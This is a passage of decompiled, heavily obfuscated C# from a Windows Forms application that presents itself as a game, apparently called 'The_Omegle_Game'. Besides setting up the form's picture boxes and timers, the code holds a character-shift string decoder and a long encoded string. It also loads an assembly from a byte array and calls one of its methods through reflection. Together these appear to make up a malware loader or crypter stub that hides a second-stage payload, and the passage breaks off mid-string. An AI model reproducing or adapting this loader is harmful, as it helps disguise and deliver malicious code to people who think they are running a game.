					num = ((int)num2 * -818867737) ^ -667781798;
					continue;
				case 38u:
					GForm1.smethod_50(PictureBox_0, bool_3: false);
					GForm1.smethod_32(Timer_0, 300);
					num = ((int)num2 * -1591777270) ^ -437755164;
					continue;
				case 37u:
					GForm1.smethod_48((Control)(object)PictureBox_3, new Size(329, 59));
					num = (int)((num2 * 1659800548) ^ 0x1754C89E);
					continue;
				case 36u:
					GForm1.smethod_49(PictureBox_1, 1);
					num = ((int)num2 * -744392232) ^ -883170082;
					continue;
				case 35u:
					GForm1.smethod_49(PictureBox_4, 4);
					num = (int)(num2 * 1931378038) ^ -1764755369;
					continue;
				case 34u:
					GForm1.smethod_46((Control)(object)PictureBox_3, new Point(337, 343));
					num = ((int)num2 * -1131146022) ^ -646018870;
					continue;
				case 33u:
					num = (int)((num2 * 1299423882) ^ 0x6537A35A);
					continue;
				case 32u:
					GForm1.smethod_47((Control)(object)PictureBox_3, smethod_5(bool_3: true));
					num = (int)((num2 * 1334661379) ^ 0x165C6516);
					continue;
				case 31u:
					GForm1.smethod_62((Control)(object)this, "MainForm");
					num = (int)(num2 * 1573007915) ^ -1735320025;
					continue;
				case 30u:
					GForm1.smethod_45((Control)(object)this, (ImageLayout)3);
					num = ((int)num2 * -1860921223) ^ -220620521;
					continue;
				case 29u:
					GForm1.smethod_45((Control)(object)PictureBox_0, (ImageLayout)3);
					num = (int)(num2 * 661999966) ^ -1126756790;
					continue;
				case 28u:
					GForm1.smethod_46((Control)(object)PictureBox_2, new Point(336, 278));
					num = ((int)num2 * -219149517) ^ 0x3F7ED132;
					continue;
				case 27u:
					GForm1.smethod_48((Control)(object)PictureBox_2, new Size(329, 59));
					num = (int)(num2 * 152158213) ^ -1935937295;
					continue;
				case 26u:
					GForm1.smethod_49(PictureBox_2, 2);
					num = ((int)num2 * -892559780) ^ 0x52423314;
					continue;
				case 25u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_0);
					num = ((int)num2 * -504332464) ^ 0x333B01AA;
					continue;
				case 24u:
					PictureBox_2 = GForm1.smethod_40();
					num = ((int)num2 * -515753681) ^ 0x5A52B842;
					continue;
				case 23u:
					GForm1.smethod_44((Control)(object)PictureBox_1, Color.Transparent);
					num = (int)((num2 * 751905332) ^ 0x1C187C0F);
					continue;
				case 22u:
					num = ((int)num2 * -1874757108) ^ -2103286819;
					continue;
				case 21u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_4);
					num = ((int)num2 * -217376024) ^ 0x1A1AD106;
					continue;
				case 20u:
					GForm1.smethod_44((Control)(object)PictureBox_4, Color.Transparent);
					num = (int)(num2 * 287457286) ^ -1584882650;
					continue;
				case 19u:
					num = ((int)num2 * -1660576329) ^ 0x55447907;
					continue;
				case 18u:
					num = (int)(num2 * 1609434171) ^ -22525790;
					continue;
				case 17u:
					GForm1.smethod_50(PictureBox_2, bool_3: false);
					num = (int)(num2 * 1533406365) ^ -108150449;
					continue;
				case 16u:
					GForm1.smethod_54((Form)(object)this, new Size(1025, 638));
					num = ((int)num2 * -1050546448) ^ -883267210;
					continue;
				case 15u:
					num = ((int)num2 * -1853758667) ^ -1337642627;
					continue;
				case 14u:
					GForm1.smethod_53((Form)(object)this, Color.White);
					num = (int)((num2 * 1862930649) ^ 0x36147498);
					continue;
				case 13u:
					GForm1.smethod_66((Control)(object)this, bool_3: false);
					num = (int)(num2 * 514900837) ^ -1342335975;
					continue;
				case 12u:
					num = (int)(num2 * 388497013) ^ -2140891777;
					continue;
				case 11u:
					GForm1.smethod_47((Control)(object)PictureBox_2, "PictureBox3");
					num = (int)(num2 * 1036180554) ^ -791882685;
					continue;
				case 10u:
					Timer_1 = GForm1.smethod_41(icontainer_0);
					num = ((int)num2 * -963514600) ^ 0x16352473;
					continue;
				case 9u:
					num = (int)(num2 * 428088067) ^ -1337561084;
					continue;
				case 8u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_2);
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_1);
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_0);
					num = (int)((num2 * 1853296972) ^ 0x3CC21226);
					continue;
				case 7u:
					num = (int)(num2 * 844573374) ^ -1386193985;
					continue;
				case 6u:
					PictureBox_4 = GForm1.smethod_40();
					num = ((int)num2 * -1375524423) ^ 0x496908EB;
					continue;
				case 5u:
					Timer_0 = GForm1.smethod_41(icontainer_0);
					num = ((int)num2 * -2074038637) ^ 0x1DB52225;
					continue;
				case 4u:
					num = (int)((num2 * 1039567194) ^ 0x54E67175);
					continue;
				case 3u:
					num = (int)((num2 * 2039467921) ^ 0x49AA15A5);
					continue;
				case 2u:
					num = ((int)num2 * -1611111900) ^ -960037505;
					continue;
				case 1u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_1);
					num = (int)((num2 * 1090923381) ^ 0x195C5F84);
					continue;
				case 0u:
					GForm1.smethod_60((Form)(object)this, new Padding(4));
					num = ((int)num2 * -2073041507) ^ -1571364799;
					continue;
				default:
					return;
				case 54u:
					break;
				case 71u:
					return;
				}
				break;
			}
		}
	}

	private static void smethod_1(Type type_0, int int_2)
	{
		MethodInfo object_ = default(MethodInfo);
		object[] array = default(object[]);
		while (true)
		{
			int num = -443646651;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x952E4604u) % 5u)
				{
				case 4u:
					object_ = GForm1.smethod_67(type_0)[3];
					num = ((int)num2 * -1743432894) ^ 0x4C4F0F4F;
					continue;
				case 2u:
					GForm1.smethod_68((object)object_, "Invoke", (CallType)2, new object[2] { 0, array });
					num = ((int)num2 * -1506239007) ^ 0x3B237DB5;
					continue;
				case 1u:
					array = new object[3]
					{
						GClass2.String_1,
						GClass2.String_0,
						"The_Omegle_Game"
					};
					num = ((int)num2 * -1119417655) ^ -411686547;
					continue;
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private static void smethod_2(Assembly assembly_0)
	{
		int num = 251367102;
		Type type_ = GForm1.smethod_69(assembly_0)[0];
		while (true)
		{
			int num2 = 581203357;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x191A261Bu) % 9u)
				{
				case 8u:
					num = 251367188;
					num2 = (int)(num3 * 1480895492) ^ -2000749197;
					continue;
				case 7u:
				{
					int num6;
					if (num == 251367142)
					{
						num2 = 1677419650;
						num6 = 1677419650;
					}
					else
					{
						num2 = 488096027;
						num6 = 488096027;
					}
					continue;
				}
				case 6u:
					num2 = ((int)num3 * -1118518884) ^ 0x18223B11;
					continue;
				case 4u:
					num2 = ((int)num3 * -1990074019) ^ -436723999;
					continue;
				case 3u:
					num = 251367129;
					num2 = (int)(num3 * 1854900609) ^ -1816202233;
					continue;
				case 2u:
					smethod_1(type_, 5);
					num = 251367134;
					num2 = 100029062;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (num == 251367199)
					{
						num4 = -706319671;
						num5 = -706319671;
					}
					else
					{
						num4 = -249843582;
						num5 = -249843582;
					}
					num2 = num4 ^ ((int)num3 * -64835652);
					continue;
				}
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly smethod_3(byte[] byte_0, bool bool_3)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 847997813;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x31455A23u) % 3u)
				{
				case 2u:
					goto IL_0003;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				result = GForm1.smethod_70(byte_0);
				num = (int)((num2 * 1076503581) ^ 0x250632BB);
			}
		}
	}

	public static string smethod_4(string string_0)
	{
		string text = null;
		int num3 = default(int);
		string string_ = default(string);
		string string_2 = default(string);
		string result = default(string);
		while (true)
		{
			int num = -49632229;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8FFF5FE5u) % 11u)
				{
				case 10u:
				{
					int num4;
					if (num3 >= GForm1.smethod_75(string_))
					{
						num = -460259838;
						num4 = -460259838;
					}
					else
					{
						num = -1522065301;
						num4 = -1522065301;
					}
					continue;
				}
				case 9u:
					num = (int)(num2 * 584236184) ^ -552957534;
					continue;
				case 8u:
				{
					int int_ = checked(GForm1.smethod_73(string_2) - 670);
					string string_3 = GForm1.smethod_72(GForm1.smethod_74(int_));
					text = GForm1.smethod_14(text, string_3);
					num = (int)(num2 * 1531990628) ^ -329302120;
					continue;
				}
				case 7u:
					string_ = string_0;
					num = ((int)num2 * -473335061) ^ 0x2A3F6833;
					continue;
				case 5u:
					num3 = 0;
					num = ((int)num2 * -636504365) ^ 0x4BAC989E;
					continue;
				case 4u:
					result = text;
					num = ((int)num2 * -181786752) ^ -1803418075;
					continue;
				case 2u:
					string_2 = GForm1.smethod_72(GForm1.smethod_71(string_, num3));
					num = -1180183404;
					continue;
				case 1u:
					num = ((int)num2 * -1161730889) ^ 0x5E2F5A35;
					continue;
				case 0u:
					num3 = checked(num3 + 1);
					num = (int)(num2 * 1178664014) ^ -1298105260;
					continue;
				case 6u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public static string smethod_5(bool bool_3)
	{
		string text = GForm1.smethod_76("\u02f2\u02f4\u030f\u02ef\u200c??\u02eb\u200c??\u200c????\u200c??\u200c??????\u02d6\u200c??\u02ea\u0305\u200c??\u200c??\u200c??\u200c??\u02df\u02ef\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u0305\u200c??\u200c??\u02df\u02d2\u0304\u0313\u0305\u02d2\u02df\u0312\u02df\u030c??\u02e7\u0300\u0305??\u02f2\u02eb??\u0306\u02f4\u02e5\u0306\u030e\u0301\u0317??\u0315\u0301\u030b\u02d7\u030c\u0301\u030b??\u0312\u02e7\u02e5??\u0306\u0300\u030b\u02d3\u0314\u0302????\u0307\u02f8\u02f1??\u0317\u0302\u02f5\u02d2\u0305\u02ff\u02f5\u02d2\u0305\u02f0??\u02d7\u02f2\u02e7\u02e5??\u0314\u02f8\u02e5\u02f3\u0313??\u02ef??\u02e9\u02e8\u200c??\u200c??\u200c??\u200c??\u02df??\u02ef\u02f0\u02ef\u200c??\u02f2\u02df????\u02df\u02e5??\u02e9\u030a\u02f5??\u200c??\u200c??\u200c??\u200c??\u200c??\u02ed\u200c??\u02df\u0307??\u02ea\u02df\u02ef\u0305\u200c????\u030d\u200c??\u200c??\u02e5\u200c??\u200c??\u200c??\u200c????\u030a\u0305\u200c??\u200c??\u0305\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u0305\u200c??\u200c??\u02df\u0305\u200c????\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c????\u0305\u200c??\u200c??\u02df\u0305\u200c??\u200c??\u200c??\u200c??\u02eb\u02df\u02ef\u02e7\u02f3\u200c????\u200c??\u02df??\u200c??\u200c??\u200c????\u200c??\u02df??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02ea\u0316\u02f6\u200c??????\u200c??\u200c??\u02df\u02e5\u200c??\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02e7\u200c??\u200c??\u0315\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02e7\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df????\u200c??\u02df??\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02d3??\u02f8\u02f6\u0306??\u200c??\u200c??????\u0305\u200c??\u200c??\u0305\u200c??\u200c??\u02ed\u0305\u200c??\u200c??\u02e7\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u02df\u02e5\u02df\u0313\u0301\u030c??\u0317\u02f7\u0315\u200c??\u200c??\u02df??\u200c??\u200c??\u02f7\u200c??\u200c??\u02df\u02ef\u200c??\u200c??\u02d6\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u02df??\u02df\u02ea\u030c\u02e8\u030a\u0300\u02e5\u02d7\u0308\u200c??\u02df\u02eb\u200c??\u200c??\u02df\u02e7\u200c??\u200c??\u02df??\u200c??\u200c??\u02ef\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02ef\u200c??\u02df\u02ef\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u0315\u02f4\u0315\u200c??\u200c??\u200c??\u02df??\u0305\u200c??\u200c????\u200c??\u02f3\u02df\u02f7??\u02f7\u200c????\u0315\u02f0\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u02f7\u0305\u0301\u0305\u02e7\u200c??\u02e7????\u200c??\u02df??\u02e8\u0302\u02df??\u200c??\u02df??\u02e9\u02df??\u200c??\u02df\u030f\u200c??\u0305\u200c????????\u0311\u02df\u02ef\u200c??\u0308\u02ef??\u200c??\u02df??\u030a??\u02df\u02eb\u200c??\u02df\u02ef\u030d\u02df\u02ef\u200c????\u030d\u02df??\u200c??\u02df??\u02e9\u0305\u200c??\u02e5\u0318\u02df\u02e5\u02df??\u0311??\u200c??\u02df??\u200c??\u02df\u02f0\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u02f6\u02d2??\u200c??\u02df????\u0315\u02d2\u0310\u02e8\u0306??\u02e6\u02f0\u02ef\u02f3\u200c??\u200c??\u02ea\u200c??\u200c????\u0315\u200c??\u200c??\u0311\u200c??\u200c??\u02ea\u200c??\u200c??\u200c??\u200c??\u02df??\u02df??\u200c??\u02df\u02e5\u02e8\u0306\u0301\u02f2??\u0317\u0314\u02ff\u02df\u030c\u02eb??\u200c??\u02df\u02e9??\u0306\u030d\u02f2??\u02f0??\u02e8\u02f0\u02ef\u02f7\u200c??\u200c??\u030f\u200c??\u200c??\u02e8\u02ef\u200c??\u200c??\u200c??\u200c??\u02df\u030a\u200c??\u200c??\u200c??\u200c??\u02df??\u030d\u200c??\u200c??\u02ff\u0308\u02ef\u0305\u200c??\u02df??\u02ea??\u030c\u02f3\u02e6\u200c??\u02df??????\u02f3??\u200c??\u02df\u0300??\u0306\u030d\u0305\u02d5\u0305??\u200c????????\u02df\u02ef\u200c??\u02e9\u02df??\u200c????\u0311\u030b\u02e5\u0316\u02eb\u02e8\u02e9\u02d5\u0301\u02e6\u0302\u02df??\u200c????\u0311\u02f5\u02e7\u02df\u02e7??\u200c??\u02df\u0305\u02f5\u0305??\u200c????\u0305\u02f1\u200c??\u02df\u02e5??\u02df\u02f8????\u0315\u200c??\u02df\u02f0\u02f8\u0318\u02df\u0315\u200c????\u0305??\u02f8??\u0315\u0311\u02f0????\u02f3\u02e5\u200c??\u200c??\u02ea\u200c??\u200c??\u200c??\u200c??\u200c??\u0311\u200c??\u200c??\u200c??\u200c??\u02df??\u0315\u200c??\u200c??\u200c??\u200c??\u02df??\u02e7??\u02e7\u200c??\u02df????\u0315\u02ef\u02e8\u0302\u02df\u0309\u200c??\u02df??\u02f0??\u02e6\u02f3??\u200c??\u02df\u0300??\u0305\u0305\u0305\u0308\u0305??\u200c??????\u0307\u02df\u02ef\u200c??\u02e9\u02df??\u200c????\u0311\u030b\u02e5\u0306\u02eb\u02ea\u02e9\u02d5\u02f3\u02f0??\u02e6\u02f3??\u200c??\u02df\u0300??\u0315\u02f6\u0302\u0318\u200c??\u200c????\u0305\u02f2??\u02f0????\u02f0\u02ef\u0301\u200c??\u200c??\u200c??\u200c??\u02df\u02f0\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u030d\u200c??\u200c??\u030f\u200c??\u200c????\u02f6\u02f3\u02e8\u200c??\u02df??\u02ea??\u02e7\u02f0??\u0307????\u02df\u02ef\u200c??\u0309\u0317\u02df\u02ef??\u0315\u200c??\u02f5\u02f0\u02eb??\u02e9\u02d6\u02eb\u02f0??\u0307??\u0308\u02df\u02ef\u200c??\u0309\u0317????\u0313\u0315\u200c??\u02f5\u02f1\u0314\u0311??\u02f6\u02f3\u02e8\u200c??\u02df??\u0300\u0315\u02ef\u200c??\u02df\u030d\u02f0??\u0306\u02d7\u02f4\u0309\u0317??\u0302??\u02ef\u200c??\u02f5\u02f0\u02eb??\u02e9\u02d3\u030c\u0301\u02e5??\u02eb\u02ef??\u02f0??????\u0315\u200c??\u02df????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u030d\u200c??\u200c??\u02e5\u0302\u02df\u0301\u200c??\u02df??\u0311??\u0306??\u02ed\u02e7\u02e7\u02f7??\u200c????\u02f2\u02e7??\u0304\u0314\u200c????\u02f8??\u0316\u02df\u0310\u0315\u0316\u0315\u0310??\u02ef\u02f8????\u0315\u200c??\u02df\u02f5\u02d6??\u200c??\u02df\u02e9??\u02f0??\u0305\u02e9\u02df\u02e7\u200c??\u02e8\u02eb\u0305\u02df??\u02f3\u200c????\u0309\u02f2????\u0313\u0308????\u02f7\u02f2??\u0316??\u02f2\u02f0\u02ef\u02f3\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????????\u0302\u02ef??\u200c????\u0311\u030f\u02df??????\u200c??\u02df??\u200c??\u200c??\u0310\u02ef\u200c??\u02df??\u0315\u200c??\u200c??\u02e8\u02df\u02ef\u200c??\u02ff\u0315\u200c??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c????\u02ef\u200c??\u02df??\u0301??\u200c??????\u02df\u02ef\u200c??\u02f7\u02ef\u200c??\u200c??\u200c??\u200c??\u02df\u02f2\u02eb\u02df\u02f3\u02df\u030c\u0305??\u200c??\u02df\u02e7\u200c??????????\u200c??\u02df????\u02eb\u02e9\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u0317\u0312\u02f5??\u02ef\u030a????\u02ef\u200c??\u02df??\u02ef??\u200c????\u030b\u200c??\u200c??\u200c??\u200c??\u02df\u02ed\u02f7\u200c??\u200c??\u02ea\u200c??\u200c????\u0305\u200c??\u02df\u02e6\u02f7\u200c??\u02df????\u200c??\u200c??\u02e7\u0315??\u200c????\u200c??\u200c??\u02df\u02d5\u02df\u02ef\u200c??\u02f4\u200c??\u200c??\u02e5\u02ef\u200c??\u200c??\u200c??\u200c??\u02df\u0311\u0315\u200c??\u02df\u02e8\u02eb\u200c??\u02df??\u02ef\u200c??\u200c????\u02df\u02eb\u200c??\u02df\u02f7\u030b\u02e5\u0306\u02eb\u02e8\u02e9\u02d4\u030d\u0305\u0301\u02df\u02e7\u200c????\u02df\u02e9\u02df\u0305\u200c??\u02e9??\u02ef\u200c??\u02df\u02f7??\u02e7\u02ea\u02d6\u200c??\u200c??\u0305\u030f\u02ef\u200c??\u02df??\u0305??\u200c??\u02df\u0310??\u0306??\u02e9\u02e7????\u200c??\u02df??\u02f2\u02e7\u02e7\u02f2\u0310\u200c????\u02f8??\u0315\u0309\u02d2\u0302\u0304??????\u0315\u02e7??\u0308\u030b\u0309\u02f6\u02f5\u02f8??\u0304\u0301\u02e5??\u02ea\u02e6\u0315\u0311\u02f2??\u02f2\u0306\u0306????????\u02df\u030d\u02d3\u030e????\u0307????\u200c??\u200c??\u02ef\u0315\u02f5??\u02f0\u02f7\u02f2??????\u02ea\u02e6??\u02f1\u02f2\u02e7\u02e7\u02df\u02f8\u200c????\u02f8??\u0315\u0309\u02d2??????????\u0315\u0305\u02f0??\u02df\u02e7\u02f0??\u02e8??\u02e6\u02f7\u02ef\u02f8??\u02df\u02ef\u200c??\u02e5\u0315\u030b\u02f0\u02f7\u0302\u02e9\u0301\u02e6\u0315\u02d6\u02f2??\u02f2\u0305\u0307??????????\u02ef\u02eb\u0305??\u0315\u02e7\u200c????????\u02df\u0305\u200c??\u02e9\u02df\u02eb\u200c????\u0311\u02f6\u02f5\u0304\u02d2????\u0315\u02f3\u0304??\u0306\u02eb\u02e8\u02ed\u02df\u02ea??????\u02d6\u02f0??\u02f1\u0315\u02e8\u02e6\u0316\u02df\u02f2??\u02f2\u0308????\u0314??????\u02ef\u0311\u0305\u02ff\u0315??\u200c??\u02e8\u02eb\u0305\u02d4\u0307\u030d\u200c????\u0309\u0310\u02d4\u02f0\u02f7??\u02e5\u02f0\u02eb\u02e8\u02ed??\u0314??????\u02d6\u02e8????\u0305??\u02e5\u02f0\u02eb\u02e8\u02ed\u02eb????????\u02d6\u02f0????\u0302\u02f7??\u0315\u02ef\u02f0??\u0316\u02d7\u02d6\u0309\u0317??\u0301\u02d2\u0315\u200c??\u02f5\u02f0\u02eb\u02e8\u02ed\u02ea\u0304??????\u02d6\u02f0??\u02df\u02e9\u02ed\u02ff\u02f0\u0302\u02f8??\u0305\u02e7\u02f5??\u0305??\u02f2??\u0306\u02f7\u02f2??\u02f2\u0307\u0306??\u0314??????\u02ef\u02f7\u0312????\u02d2\u02f2??\u02f2\u0307\u02f4??\u0314????\u02e6??\u0314????\u0305\u02e7??\u0308\u030b\u0309\u02f6\u02f5\u02f1\u0305??\u200c??\u02df\u0310????\u02eb\u02e6\u02e6\u0315\u030d\u02f2??\u02f2\u0306\u02d4??\u0314??????\u02ef\u0302??\u02df\u02ef\u200c??\u02e5\u0317\u030d\u200c????\u02eb\u0315??\u200c????\u02df\u0305\u200c??\u02df\u0315\u200c????\u02f6\u02d2??\u200c??\u02df????\u0315\u0316??\u02df\u0305\u200c??????\u02eb??\u02e9??\u0315\u02f0????\u02f3\u02ef\u200c??\u200c??\u02f5\u0305??\u200c????\u030d??\u200c????\u200c??\u200c??\u02df\u0307\u0305??\u200c??\u02e6????\u200c????\u02e9\u02df\u02ef\u200c??\u0318\u0315\u200c??\u02df\u02ea\u0315??\u200c??????\u200c??\u200c??\u200c??\u200c??\u02df\u02e8\u0301??\u200c????\u0311\u200c??\u200c??\u02e5\u0315\u200c??\u02df\u02e5\u02eb??\u200c??\u02df\u02f4\u200c??\u200c??\u02f4\u0315\u200c??\u02df??\u02df??\u200c??\u02df\u02e5\u02e8\u0306??\u02eb\u02e6\u0317\u02d4\u02f2\u02e7??\u0312??\u200c????\u02f8??\u0315\u0311\u0310\u030e\u02e6\u02eb\u02e5\u200c??\u02df\u02e9??\u0305\u02e7\u0305\u0305\u0315\u02e7\u200c??????\u0310\u02df\u0305\u200c??\u02e9\u02df\u02f3\u200c????\u0311\u02f6??\u0305\u0311\u02f0????\u02d6\u02ed\u0309\u0317\u02df\u02f0\u02f0\u0315\u200c??\u02f5\u02f0\u02eb\u02ea\u02ed\u02e6\u030c??????\u02d6\u02f5??????\u02eb\u02e7??\u02d2??\u200c????\u02f2\u02e7??\u02f4\u0307\u200c????\u02f8??\u0315\u0311\u02d2\u02f7\u0314??????\u0315\u02e7\u0305\u02f8\u02ef??\u200c????\u02df\u02eb\u02df\u02ef\u200c??\u02e9\u02df\u02f3\u200c????\u0311\u02f6??\u0305??\u02f5??\u0315\u02ef\u02f0??\u02f1\u02df\u0306\u02df\u02ef\u200c??\u0309\u0317????\u02f7\u02ef\u200c??\u02f5\u02f0\u02eb\u02ea\u02ed??\u0304??????\u02d6??????????\u02e7??\u02d6??\u200c??\u02df\u0305\u0314\u0305\u02e7\u200c????\u0305\u02e5\u200c??\u02df\u0310??\u0315\u02f3\u02f0??\u02f0\u02f7\u02f5??\u0306\u02f7\u0305\u0314\u0315??\u200c????????\u02df\u02ef\u200c??\u02e9\u02df\u0315\u200c??\u02df\u02f7\u0305??\u02ef\u200c??\u02df????\u0313\u200c??\u200c??\u02e9??\u02f3\u200c??\u02df\u02f7\u02f2??\u0306??\u02eb\u02e6??\u030b\u02f2\u02e7??\u030c\u02f7\u200c????\u02f8??\u0315\u0311\u02d2\u02d4\u0314\u02d5????\u0316??\u02e5\u02ea??\u02f3\u02f0??????\u02f6\u02df\u02ef\u200c??\u0309\u0317??\u030f??\u200c??\u02df\u02f5\u02f0\u02eb\u02ea\u02ed??\u02e6??????\u02d6\u0304??\u02f1\u0314????\u030c\u02f3??\u200c??\u02df????\u030c\u02ef??\u200c??\u02df??\u02e7\u02eb\u02e7??\u200c??\u02df\u0305\u030b\u02df\u02eb\u200c????\u0305\u02e6\u200c??\u02df\u0310\u02e5\u02f7??\u02e7\u200c??\u02df??\u02e8\u02f0\u02f7\u02f1??\u02f0\u02d6\u0303\u02e6??\u02ef\u030d??\u02ef\u200c????\u030e\u0315\u030a??\u0316\u02e7??\u02e7\u02e7\u0309\u200c??\u200c??\u0305\u02d2\u0305\u200c??\u02df??\u0305??\u200c??\u02df\u02e5\u030c??\u02f3\u02f7??\u0305\u02f3\u0305\u0309\u0305??\u200c????????\u02df\u02ef\u200c??\u02e9\u02df??\u200c??\u02df\u02ff\u0301\u02e7\u02e9\u0315??\u200c??\u02df\u0305\u0307\u0315??\u200c????\u0305\u02e7\u200c??\u02df\u0310??\u0316\u02eb\u02ea\u02ed??????????\u02d6\u0304??\u02f0\u02eb\u02ea\u02ed??\u0300??????\u02d6\u02f0????\u0304\u02f5??\u0315\u02ef\u02ff??\u0315\u0311\u02d2\u02f1??\u02d5????\u0316??????\u0304\u02d2????\u0314\u02d2????\u0315\u0301\u02f0??\u0317??\u02e7\u02e5\u02f0\u02eb\u02ea\u02ed??\u02ea??????\u02d6\u0303\u02e9??\u02f7\u02e7??\u02d7\u02f7\u02eb\u02e6\u0315\u030d\u02f2??\u0318\u0305\u0307??\u0314??????\u02df\u0304??\u02df\u0306\u0300??\u02df\u02f0\u02eb\u02e7??\u02ef\u0305\u0312??????\u02f2??\u0318\u0305????\u0314??????\u02ef\u0315\u0305\u0314\u0305\u200c??\u02df\u02e8\u02eb\u0305\u030e\u0305\u200c??\u02df??\u0309\u0310\u02d4\u02ef\u02f8????\u0315\u200c??\u02df\u0302\u02df\u02e7\u200c??\u02df??\u02e9\u02df\u0301\u200c??\u02df\u030e\u0314??\u200c??\u02df??\u030c\u02ef??\u200c??\u02df\u0300??\u0315\u0309\u02f0??\u02f6\u02ef??\u200c??\u02df\u0300\u02e9\u0305\u02df\u02f2\u02eb\u02df\u02f3\u02df\u030a\u200c??\u200c??\u02df\u02ef\u200c??????????\u200c??\u02df????\u02eb??\u02e9\u0318\u02e7\u02e8\u02f0\u02ef\u02f7\u200c??\u200c??\u02f3\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02f3\u200c??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c????\u02ef??\u02ef\u200c????\u0307\u02f7\u02f0????\u02d7\u02e6\u0309\u0317\u02df\u0309\u02f4\u02ef\u200c??\u02f5\u02ef??\u0310\u0318\u0305??\u02ef??\u0305\u200c??\u02df\u0307\u0305\u02e6\u200c??\u02df\u02e9\u02e7\u02df??\u02e8\u02d2??\u02ef\u0304??????\u030d??\u0305\u200c????\u0307??\u02f5\u200c??\u200c??\u02e7??\u02eb\u200c??\u200c??\u030d??\u02ef\u200c??\u02e9\u0317\u02df\u030c\u02df\u0305\u200c??\u02e7??\u0315??\u200c??\u02df\u030d??\u0315\u200c????\u030c\u02eb\u02e8\u200c??\u02df\u02e9??\u0306\u0309??\u02e9\u02d2\u02d2\u02e5\u0302\u02f0\u02f3\u200c??\u02df????\u0300\u0315\u030d\u200c??\u02df\u030e????\u02ef\u200c??\u02df\u02ef\u0311\u02e6\u0302????\u200c??\u02df??\u030f??\u0318\u02df\u02e6\u02df??\u02e7??\u200c??\u02df??\u200c??\u02df\u02f0\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2??\u02f6\u02d2??\u200c??\u02df????\u0315\u030d\u0300??\u0315\u0305\u02f0????\u02f3\u02e7\u200c??\u200c??\u02e7\u02ef\u200c??\u02df??\u0315\u200c??\u02df????\u200c??\u200c??\u02f5\u0315\u200c??\u02df\u02ea\u0301\u200c??\u200c??\u200c??\u200c??\u02df\u02f5\u0315\u200c??\u02df\u02ea\u0301\u200c??\u200c??\u0305\u030c\u02e5\u02eb\u200c??????\u0309\u02df\u02ef\u200c??\u02e7??\u0305??\u200c??\u02df\u030d??\u02ef\u200c????\u0305\u02e7??\u02e9\u02df\u02f3\u200c??\u02df\u02f7\u02e9??\u0306\u02eb\u02e7\u02e9\u02d5\u0305\u02e5\u0302\u02f0??\u200c??\u02df??\u030d??\u200c??\u02df??\u0305\u0311\u02e6\u0302\u02df??\u200c????\u0311??\u02e9\u02df\u02eb\u200c??\u02df\u02f7\u02eb??\u02e6\u02f3??\u200c??\u02df\u0300\u02e9\u02df\u02e7\u200c??\u02df\u02f7????\u02ef\u0309\u0305\u030a\u02ef\u200c??\u02df\u02e8\u02eb\u0305\u0308\u0307\u0301\u200c????\u0309\u